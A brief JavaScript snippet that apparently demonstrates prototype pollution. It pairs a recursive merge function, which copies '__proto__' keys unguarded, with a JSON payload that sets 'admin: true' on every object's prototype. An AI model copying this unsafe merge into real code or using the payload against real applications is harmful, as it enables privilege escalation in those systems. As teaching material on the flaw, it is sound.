function merge(target, src) {
  for (const k in src) {
    if (src[k] && typeof src[k] === 'object') target[k] = merge(target[k] ?? {}, src[k]);
    else target[k] = src[k];
  }
  return target;
}
const payload = JSON.parse('{"__proto__": {"admin": true}}');
merge({}, payload);
console.log({}.admin, 'admin' in {});

